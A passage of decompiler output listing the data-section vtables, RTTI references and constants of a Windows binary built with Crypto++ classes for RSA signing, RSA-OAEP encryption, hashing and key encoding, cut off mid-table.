__int64 (__fastcall *off_13F181EC8[2])() = { &sub_13F103840, &CryptoPP::BERGeneralDecoder::`RTTI Complete Object Locator' }; // weak
__int64 (__fastcall *off_13F181ED8[47])() =
{
  &sub_13F10B660,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F102480,
  &sub_13F102490,
  &sub_13F105160,
  &sub_13F1024A0,
  &sub_13F102A50,
  &sub_13F102490,
  &sub_13F105160,
  &sub_13F110580,
  &sub_13F10FFA0,
  &sub_13F110670,
  &sub_13F105150,
  &sub_13F105140,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F102A60,
  &sub_13F10F9D0,
  &sub_13F129880,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F10D0F0,
  &sub_13F10C150,
  &sub_13F10FAF0,
  &sub_13F105160,
  &sub_13F10FD20,
  &sub_13F10FB70,
  &sub_13F105160,
  &sub_13F110F70,
  &sub_13F102490,
  &sub_13F102500,
  &sub_13F1024C0,
  &sub_13F102530,
  &sub_13F10FA70,
  &guard_check_icall_nop,
  &CryptoPP::BERGeneralDecoder::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F182050[4])() =
{
  &sub_13F10B638,
  &sub_13F1103A0,
  &sub_13F110450,
  &CryptoPP::DERGeneralEncoder::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F182070[6])() =
{
  &sub_13F10B6A0,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F131B00,
  &sub_13F102490
}; // weak
__int64 (__fastcall *off_13F1821E0[4])() =
{
  &sub_13F10B644,
  &sub_13F1103A0,
  &sub_13F110450,
  &CryptoPP::BERSequenceDecoder::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F182200[47])() =
{
  &sub_13F10B660,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F102480,
  &sub_13F102490,
  &sub_13F105160,
  &sub_13F1024A0,
  &sub_13F102A50,
  &sub_13F102490,
  &sub_13F105160,
  &sub_13F110580,
  &sub_13F10FFA0,
  &sub_13F110670,
  &sub_13F105150,
  &sub_13F105140,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F102A60,
  &sub_13F10F9D0,
  &sub_13F129880,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F10D0F0,
  &sub_13F10C150,
  &sub_13F10FAF0,
  &sub_13F105160,
  &sub_13F10FD20,
  &sub_13F10FB70,
  &sub_13F105160,
  &sub_13F110F70,
  &sub_13F102490,
  &sub_13F102500,
  &sub_13F1024C0,
  &sub_13F102530,
  &sub_13F10FA70,
  &guard_check_icall_nop,
  &CryptoPP::BERSequenceDecoder::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F182378[4])() =
{
  &sub_13F10B638,
  &sub_13F1103A0,
  &sub_13F110450,
  &CryptoPP::DERSequenceEncoder::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F182398[6])() =
{
  &sub_13F10B6A0,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F131B00,
  &sub_13F102490
}; // weak
__int64 (__fastcall *off_13F182508[3])() = { &sub_13F10B644, &sub_13F1103A0, &sub_13F110450 }; // weak
void *CryptoPP::PK_SignatureScheme::InvalidKeyLength::`vftable' = &sub_13F1015C0; // weak
__int64 (__fastcall *off_13F182770[2])() = { &sub_13F1015C0, &sub_13F1015B0 }; // weak
void *CryptoPP::FilterPutSpaceHelper::`vftable' = &sub_13F10D760; // weak
__int64 (__fastcall *off_13F1827D0[49])() =
{
  &sub_13F10D7F0,
  &sub_13F101F70,
  &sub_13F10D830,
  &sub_13F102080,
  &sub_13F10D850,
  &sub_13F102490,
  &sub_13F129F80,
  &sub_13F1024A0,
  &sub_13F129B90,
  &sub_13F102490,
  &sub_13F102490,
  &sub_13F1298B0,
  &sub_13F1295C0,
  &sub_13F129C10,
  &guard_check_icall_nop,
  &sub_13F1024C0,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F1107C0,
  &sub_13F10F9D0,
  &sub_13F110410,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F12A990,
  &sub_13F129450,
  &sub_13F10FAF0,
  &sub_13F10FC80,
  &sub_13F10FD20,
  &sub_13F10FB70,
  &sub_13F10FC00,
  &sub_13F110F70,
  &sub_13F1021D0,
  &sub_13F1291E0,
  &sub_13F1291E0,
  &sub_13F129580,
  &sub_13F10FA70,
  &sub_13F129D20,
  &sub_13F1021D0,
  &sub_13F1021D0,
  &CryptoPP::HashFilter::`RTTI Complete Object Locator'
}; // weak
void *off_13F182958[4] =
{
  &loc_13F10D744,
  &sub_13F1103A0,
  &sub_13F110450,
  &CryptoPP::HashFilter::`RTTI Complete Object Locator'
}; // weak
void *off_13F182978[2] = { &loc_13F10D750, &CryptoPP::ArraySink::`RTTI Complete Object Locator' }; // weak
__int64 (__fastcall *off_13F182988[46])() =
{
  &sub_13F103240,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F129520,
  &sub_13F102490,
  &sub_13F129EA0,
  &sub_13F1024A0,
  &sub_13F129A00,
  &sub_13F102490,
  &sub_13F102490,
  &sub_13F110580,
  &sub_13F10FFA0,
  &sub_13F110670,
  &guard_check_icall_nop,
  &sub_13F1024C0,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F1107C0,
  &sub_13F10F9D0,
  &sub_13F110410,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F102A70,
  &sub_13F1024C0,
  &sub_13F10FAF0,
  &sub_13F10FC80,
  &sub_13F10FD20,
  &sub_13F10FB70,
  &sub_13F10FC00,
  &sub_13F110F70,
  &sub_13F102490,
  &sub_13F102500,
  &sub_13F1024C0,
  &sub_13F102530,
  &sub_13F10FA70,
  &CryptoPP::ArraySink::`RTTI Complete Object Locator'
}; // weak
void *off_13F182AF8[4] =
{
  &loc_13F1084C4,
  &sub_13F1103A0,
  &sub_13F110450,
  &CryptoPP::ArrayXorSink::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F182B18[46])() =
{
  &sub_13F103240,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F102480,
  &sub_13F102490,
  &sub_13F129F10,
  &sub_13F1024A0,
  &sub_13F129A00,
  &sub_13F102490,
  &sub_13F102490,
  &sub_13F110580,
  &sub_13F10FFA0,
  &sub_13F110670,
  &guard_check_icall_nop,
  &sub_13F1024C0,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F1107C0,
  &sub_13F10F9D0,
  &sub_13F110410,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F102A70,
  &sub_13F1024C0,
  &sub_13F10FAF0,
  &sub_13F10FC80,
  &sub_13F10FD20,
  &sub_13F10FB70,
  &sub_13F10FC00,
  &sub_13F110F70,
  &sub_13F102490,
  &sub_13F102500,
  &sub_13F1024C0,
  &sub_13F102530,
  &sub_13F10FA70,
  &CryptoPP::ArrayXorSink::`RTTI Complete Object Locator'
}; // weak
void *off_13F182C88[3] = { &loc_13F1084C4, &sub_13F1103A0, &sub_13F110450 }; // weak
void *CryptoPP::NameValuePairs::`vftable' = &sub_13F101D80; // weak
__int64 qword_13F182E58 = 4473153i64; // weak
__int64 (__fastcall *off_13F1833E0[3])() =
{
  &sub_13F1015C0,
  &sub_13F1015B0,
  &CryptoPP::InvalidCiphertext::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F1833F8[3])() =
{
  &sub_13F1015C0,
  &sub_13F1015B0,
  &CryptoPP::CannotFlush::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F183410[3])() =
{
  &sub_13F1015C0,
  &sub_13F1015B0,
  &CryptoPP::NameValuePairs::ValueTypeMismatch::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F183428[2])() = { &sub_13F101DB0, &sub_13F1015B0 }; // weak
void *CryptoPP::BufferedTransformation::NoChannelSupport::`vftable' = &sub_13F1015C0; // weak
void *CryptoPP::InvalidKeyLength::`vftable' = &sub_13F1015C0; // weak
void *CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable' = &sub_13F1015C0; // weak
__int64 (__fastcall *off_13F183700[4])() =
{
  &sub_13F102DC0,
  &sub_13F15E670,
  &sub_13F15E670,
  &CryptoPP::AlgorithmParametersTemplate<int>::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F183720[4])() =
{
  &sub_13F106050,
  &sub_13F104FA0,
  &sub_13F104F60,
  &CryptoPP::AlgorithmParametersTemplate<CryptoPP::ConstByteArrayParameter>::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F183740[4])() =
{
  &sub_13F105EF0,
  &sub_13F104E60,
  &sub_13F104E10,
  &CryptoPP::SelfTestFailure::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F183760[2])() = { &sub_13F1015C0, &sub_13F1015B0 }; // weak
void *CryptoPP::PK_DefaultEncryptionFilter::`vftable' = &sub_13F10F760; // weak
void *off_13F183AE0[4] =
{
  &loc_13F10F684,
  &sub_13F1103A0,
  &sub_13F110450,
  &CryptoPP::PK_DefaultDecryptionFilter::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F183B00[50])() =
{
  &sub_13F10F6C0,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F102480,
  &sub_13F102490,
  &sub_13F110A20,
  &sub_13F1024A0,
  &sub_13F110590,
  &sub_13F102490,
  &sub_13F102490,
  &sub_13F1298B0,
  &sub_13F104DE0,
  &sub_13F129C10,
  &guard_check_icall_nop,
  &sub_13F1024C0,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F1107C0,
  &sub_13F10F9D0,
  &sub_13F110410,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F12A990,
  &sub_13F129450,
  &sub_13F10FAF0,
  &sub_13F10FC80,
  &sub_13F10FD20,
  &sub_13F104D10,
  &sub_13F10FC00,
  &sub_13F110F70,
  &sub_13F1021D0,
  &sub_13F1291E0,
  &sub_13F1291E0,
  &sub_13F129580,
  &sub_13F10FA70,
  &sub_13F129D20,
  &sub_13F1021D0,
  &sub_13F1021D0,
  &sub_13F102490,
  &CryptoPP::PK_DefaultDecryptionFilter::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F183C90[3])() = { &sub_13F10F678, &sub_13F1103A0, &sub_13F110450 }; // weak
void *CryptoPP::CombinedNameValuePairs::`vftable' = &sub_13F111A90; // weak
void *CryptoPP::AlgorithmParametersTemplate<unsigned char const *>::`vftable' = &sub_13F111A50; // weak
__int64 (__fastcall *off_13F184620[3])() = { &sub_13F111A50, &sub_13F111AC0, &sub_13F112010 }; // weak
void *CryptoPP::Integer::DivideByZero::`vftable' = &sub_13F1015C0; // weak
__int64 (__fastcall *off_13F185260[3])() =
{
  &sub_13F1015C0,
  &sub_13F1015B0,
  &CryptoPP::Integer::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F185278[4])() = { &sub_13F114320, &sub_13F115220, &sub_13F11C790, &sub_13F1029F0 }; // weak
void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable' = &sub_13F109C80; // weak
__int64 (__fastcall *off_13F185368[28])() =
{
  &sub_13F114420,
  &sub_13F11D7A0,
  &sub_13F11EB60,
  &sub_13F1146B0,
  &sub_13F11ECC0,
  &sub_13F102490,
  &sub_13F11D4D0,
  &sub_13F123320,
  &sub_13F1144B0,
  &sub_13F1220C0,
  &sub_13F135390,
  &sub_13F134D00,
  &sub_13F135460,
  &sub_13F11F850,
  &sub_13F120160,
  &sub_13F1208C0,
  &sub_13F1202F0,
  &sub_13F1227E0,
  &sub_13F11D180,
  &sub_13F1351A0,
  &sub_13F11C0C0,
  &sub_13F1223F0,
  &sub_13F102470,
  &sub_13F11C3B0,
  &sub_13F102490,
  &sub_13F11C560,
  &sub_13F11C690,
  &CryptoPP::MontgomeryRepresentation::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F185448[28])() =
{
  &sub_13F114460,
  &sub_13F11D7A0,
  &sub_13F11EB60,
  &sub_13F1146B0,
  &sub_13F11ECC0,
  &sub_13F102490,
  &sub_13F11D4D0,
  &sub_13F123320,
  &sub_13F1144B0,
  &sub_13F1220C0,
  &sub_13F135390,
  &sub_13F134D00,
  &sub_13F135460,
  &sub_13F11F850,
  &sub_13F120170,
  &sub_13F1209F0,
  &sub_13F120450,
  &sub_13F122910,
  &sub_13F11D180,
  &sub_13F1351A0,
  &sub_13F11C270,
  &sub_13F122660,
  &sub_13F102470,
  &sub_13F11C3F0,
  &sub_13F1021D0,
  &sub_13F11C590,
  &sub_13F11C6B0,
  &CryptoPP::StringStore::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F185528[47])() =
{
  &sub_13F103280,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F102480,
  &sub_13F102490,
  &sub_13F105160,
  &sub_13F1024A0,
  &sub_13F102A50,
  &sub_13F102490,
  &sub_13F105160,
  &sub_13F110580,
  &sub_13F10FFA0,
  &sub_13F110670,
  &sub_13F105150,
  &sub_13F105140,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F102A60,
  &sub_13F10F9D0,
  &sub_13F129880,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F12A9E0,
  &sub_13F1294A0,
  &sub_13F10FAF0,
  &sub_13F105160,
  &sub_13F10FD20,
  &sub_13F10FB70,
  &sub_13F105160,
  &sub_13F110F70,
  &sub_13F102490,
  &sub_13F102500,
  &sub_13F1024C0,
  &sub_13F102530,
  &sub_13F10FA70,
  &sub_13F12A860,
  &CryptoPP::StringStore::`RTTI Complete Object Locator'
}; // weak
void *off_13F1856A0[3] = { &loc_13F1084B8, &sub_13F1103A0, &sub_13F110450 }; // weak
void *CryptoPP::SHA1::`vftable' = &sub_13F105E10; // weak
__int64 qword_13F1857A8[5] = { 8589934594i64, 17179869186i64, 34359738372i64, 34359738376i64, 8i64 }; // weak
void *CryptoPP::KDF2_RNG::`vftable' = &sub_13F1143A0; // weak
void *CryptoPP::EuclideanDomainOf<CryptoPP::Integer>::`vftable' = &sub_13F1142E0; // weak
void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::Integer>::`vftable' = &sub_13F114260; // weak
__int64 (__fastcall *off_13F185AB8[3])() = { &sub_13F111A50, &sub_13F114E00, &sub_13F120120 }; // weak
__int128 xmmword_13F185AD0 = 0x21FFFFFFFFFFFFFFFi64; // weak
__int128 xmmword_13F185AE0 = 0x103FFFFFFFFFFFFFFFi64; // weak
__int128 xmmword_13F185AF0 = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFi64; // weak
void *CryptoPP::CryptoMaterial::InvalidMaterial::`vftable' = &sub_13F1015C0; // weak
char aModulus[8] = "Modulus"; // weak
char aPrime1[7] = "Prime1"; // weak
char aPrime2[7] = "Prime2"; // weak
void *CryptoPP::P1363_MGF1::`vftable' = &sub_13F105DE0; // weak
__int64 (__fastcall *off_13F1861D8[10])() =
{
  &sub_13F105DE0,
  &sub_13F127890,
  &sub_13F1024C0,
  &sub_13F124930,
  &guard_check_icall_nop,
  &sub_13F127870,
  &sub_13F13BE70,
  &sub_13F10E920,
  &sub_13F124930,
  &sub_13F124930
}; // weak
__int64 (__fastcall *off_13F186288[10])() =
{
  &sub_13F103930,
  &sub_13F10BB00,
  &sub_13F10C780,
  &sub_13F1029F0,
  &sub_13F15E670,
  &sub_13F1038F0,
  &sub_13F103910,
  &sub_13F15E670,
  &sub_13F15E670,
  &CryptoPP::X509PublicKey::`RTTI Complete Object Locator'
}; // weak
void *off_13F1862D8[12] =
{
  &loc_13F1084F4,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F1025D0,
  &sub_13F1044A0,
  &sub_13F104460,
  &sub_13F102490,
  &sub_13F102630,
  &sub_13F102630,
  &sub_13F102630,
  &CryptoPP::PKCS8PrivateKey::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F186338[12])() =
{
  &sub_13F1039B0,
  &sub_13F10B730,
  &sub_13F10C3E0,
  &sub_13F1029F0,
  &sub_13F15E670,
  &sub_13F1038F0,
  &sub_13F103910,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F10BFD0,
  &sub_13F10CB70,
  &CryptoPP::PKCS8PrivateKey::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F186398[2])() = { &sub_13F102780, &CryptoPP::PKCS8PrivateKey::`RTTI Complete Object Locator' }; // weak
void *off_13F1863A8[12] =
{
  &loc_13F1083F8,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F1025D0,
  &loc_13F10850C,
  &loc_13F108494,
  &sub_13F102490,
  &sub_13F102630,
  &sub_13F102630,
  &sub_13F102630,
  &qword_13F1A58A0
}; // weak
__int64 (__fastcall *off_13F186408[9])() =
{
  &sub_13F106470,
  &sub_13F103A20,
  &sub_13F103A20,
  &sub_13F1035F0,
  &sub_13F103680,
  &sub_13F103710,
  &sub_13F102490,
  &sub_13F124990,
  &qword_13F1A6310
}; // weak
__int64 (__fastcall *off_13F186450[10])() =
{
  &sub_13F1083E0,
  &sub_13F10BB00,
  &sub_13F10C780,
  &sub_13F1029F0,
  &sub_13F1263C0,
  &sub_13F1038F0,
  &sub_13F103910,
  &sub_13F1251A0,
  &sub_13F1258C0,
  &qword_13F1A7260
}; // weak
void *off_13F1864A0[12] =
{
  &loc_13F1084E8,
  &sub_13F126EB0,
  &sub_13F124B70,
  &sub_13F128A80,
  &sub_13F1025D0,
  &loc_13F108464,
  &loc_13F1084DC,
  &sub_13F102490,
  &sub_13F102630,
  &sub_13F102630,
  &sub_13F102630,
  &qword_13F1A6F10
}; // weak
__int64 (__fastcall *off_13F186500[9])() =
{
  &sub_13F1064B0,
  &sub_13F103A20,
  &sub_13F103A20,
  &sub_13F1035F0,
  &sub_13F103680,
  &sub_13F103710,
  &sub_13F102490,
  &sub_13F124990,
  &qword_13F1A5C98
}; // weak
void *off_13F186548[10] =
{
  &loc_13F108500,
  &sub_13F103A40,
  &sub_13F103A50,
  &sub_13F1029F0,
  &sub_13F103A80,
  &sub_13F1038F0,
  &sub_13F103910,
  &sub_13F1251A0,
  &sub_13F1258C0,
  &qword_13F1A6488
}; // weak
void *off_13F186598[5] =
{
  &loc_13F108488,
  &sub_13F103730,
  &sub_13F102490,
  &sub_13F125240,
  &qword_13F1A5070
}; // weak
void *off_13F1865C0[12] =
{
  &loc_13F1084D0,
  &loc_13F108410,
  &loc_13F108440,
  &sub_13F1029F0,
  &loc_13F108524,
  &sub_13F1038F0,
  &sub_13F103910,
  &sub_13F125080,
  &sub_13F125730,
  &sub_13F10BFD0,
  &sub_13F10CB70,
  &qword_13F1A6230
}; // weak
__int64 (__fastcall *off_13F186620[2])() = { &sub_13F1259C0, &qword_13F1A3D98 }; // weak
void *off_13F186630[12] =
{
  &loc_13F108458,
  &sub_13F126570,
  &sub_13F124A10,
  &sub_13F128130,
  &sub_13F1025D0,
  &loc_13F103A70,
  &sub_13F103A60,
  &sub_13F102490,
  &sub_13F102630,
  &sub_13F102630,
  &sub_13F102630,
  &CryptoPP::PrimeSelector::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F186690[3])() =
{
  &sub_13F1247E0,
  &sub_13F15E670,
  &CryptoPP::RSAPrimeSelector::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F1866A8[3])() =
{
  &sub_13F124810,
  &sub_13F127480,
  &CryptoPP::TF_SignerImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F1866C0[20])() =
{
  &sub_13F105D80,
  &sub_13F127B10,
  &sub_13F127880,
  &sub_13F1276B0,
  &sub_13F127870,
  &sub_13F127550,
  &sub_13F124910,
  &sub_13F102490,
  &sub_13F127960,
  &sub_13F1278E0,
  &sub_13F10DE10,
  &sub_13F110FC0,
  &sub_13F10E550,
  &sub_13F111010,
  &sub_13F1110A0,
  &sub_13F126450,
  &sub_13F104610,
  &sub_13F104200,
  &sub_13F104200,
  &CryptoPP::TF_SignerImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`RTTI Complete Object Locator'
}; // weak
void *off_13F186760[9] =
{
  &loc_13F108404,
  &sub_13F101F70,
  &sub_13F1248F0,
  &sub_13F102080,
  &sub_13F1028D0,
  &sub_13F102960,
  &sub_13F1248B0,
  &sub_13F1264E0,
  &CryptoPP::TF_SignerImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`RTTI Complete Object Locator'
}; // weak
void *off_13F1867A8[5] =
{
  &loc_13F1084A0,
  &sub_13F126530,
  &sub_13F126550,
  &sub_13F126470,
  &CryptoPP::TF_VerifierImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F1867D0[22])() =
{
  &sub_13F105D20,
  &sub_13F127B10,
  &sub_13F127880,
  &sub_13F127790,
  &sub_13F127870,
  &sub_13F127590,
  &sub_13F124910,
  &sub_13F102490,
  &sub_13F127960,
  &sub_13F127920,
  &sub_13F10DFF0,
  &sub_13F111970,
  &sub_13F10E7F0,
  &sub_13F1119C0,
  &sub_13F110DD0,
  &sub_13F10E400,
  &sub_13F110E20,
  &sub_13F126450,
  &sub_13F104610,
  &sub_13F104200,
  &sub_13F104200,
  &CryptoPP::TF_VerifierImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`RTTI Complete Object Locator'
}; // weak
void *off_13F186880[9] =
{
  &loc_13F108428,
  &sub_13F101F70,
  &sub_13F1248F0,
  &sub_13F102080,
  &sub_13F1027D0,
  &sub_13F102850,
  &sub_13F1248D0,
  &sub_13F126510,
  &CryptoPP::TF_VerifierImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`RTTI Complete Object Locator'
}; // weak
void *off_13F1868C8[5] =
{
  &loc_13F1084AC,
  &sub_13F126540,
  &sub_13F126540,
  &sub_13F126470,
  &CryptoPP::TF_DecryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F1868F0[11])() =
{
  &sub_13F105D80,
  &sub_13F104850,
  &sub_13F104810,
  &sub_13F104A30,
  &sub_13F104890,
  &sub_13F104930,
  &sub_13F10D860,
  &sub_13F10FDC0,
  &sub_13F104200,
  &sub_13F104200,
  &CryptoPP::TF_DecryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`RTTI Complete Object Locator'
}; // weak
void *off_13F186948[9] =
{
  &loc_13F108404,
  &sub_13F101F70,
  &sub_13F104120,
  &sub_13F102080,
  &sub_13F1028D0,
  &sub_13F102960,
  &sub_13F104290,
  &sub_13F104250,
  &CryptoPP::TF_DecryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`RTTI Complete Object Locator'
}; // weak
void *off_13F186990[5] =
{
  &loc_13F1084A0,
  &sub_13F104140,
  &sub_13F104210,
  &sub_13F104170,
  &CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F1869B8[11])() =
{
  &sub_13F105D20,
  &sub_13F104850,
  &sub_13F104810,
  &sub_13F104A30,
  &sub_13F104890,
  &sub_13F104930,
  &sub_13F10DB20,
  &sub_13F10FE90,
  &sub_13F104200,
  &sub_13F104200,
  &CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`RTTI Complete Object Locator'
}; // weak
void *off_13F186A10[9] =
{
  &loc_13F108428,
  &sub_13F101F70,
  &sub_13F104120,
  &sub_13F102080,
  &sub_13F1027D0,
  &sub_13F102850,
  &sub_13F1041C0,
  &sub_13F104180,
  &CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`RTTI Complete Object Locator'
}; // weak
void *off_13F186A58[4] = { &loc_13F1084AC, &sub_13F104140, &sub_13F104140, &sub_13F104170 }; // weak
void *CryptoPP::PK_MessageAccumulatorImpl<CryptoPP::SHA1>::`vftable' = &sub_13F124750; // weak
__int64 qword_13F186BF0 = 59i64; // weak
void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::PrimeSelector const *>::`vftable' = &sub_13F111A50; // weak
void *CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable' = &sub_13F1015C0; // weak
void *CryptoPP::FilterWithBufferedInput::`vftable' = &sub_13F103040; // weak
__int64 (__fastcall *off_13F187000[3])() =
{
  &guard_check_icall_nop,
  &sub_13F1024C0,
  &CryptoPP::FilterWithBufferedInput::`RTTI Complete Object Locator'
}; // weak
void *off_13F187018[4] =
{
  &loc_13F10841C,
  &sub_13F1103A0,
  &sub_13F110450,
  &CryptoPP::OutputProxy::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F187038[46])() =
{
  &sub_13F1291A0,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F129550,
  &sub_13F102490,
  &sub_13F12A110,
  &sub_13F12A7A0,
  &guard_check_icall_nop,
  &sub_13F102490,
  &sub_13F102490,
  &sub_13F129910,
  &sub_13F129670,
  &sub_13F129CD0,
